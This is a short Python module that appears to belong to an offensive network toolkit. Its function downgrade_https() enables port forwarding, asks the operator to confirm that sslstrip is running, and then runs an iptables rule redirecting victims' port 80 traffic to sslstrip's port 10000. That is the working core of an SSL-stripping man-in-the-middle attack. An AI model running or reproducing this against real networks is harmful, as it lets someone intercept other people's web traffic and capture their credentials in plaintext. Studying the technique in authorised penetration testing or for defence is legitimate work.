import subprocess
import inquirer
from utils.enable_port_fwd import enable_port_fwd


def downgrade_https():
    """
    Downgrades HTTPS
    """
    downgrade_cmd = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
    print("[+] Downgrading HTTPS to HTTP...")
    enable_port_fwd()
    questions = [inquirer.Text("confirmation", message="You must enable sslstrip and type 'yes' to continue.", validate=lambda _, x: x == 'yes')]
    inquirer.prompt(questions)
    proc = subprocess.Popen(downgrade_cmd, shell=True, stdout=subprocess.PIPE)
    proc.communicate()[0]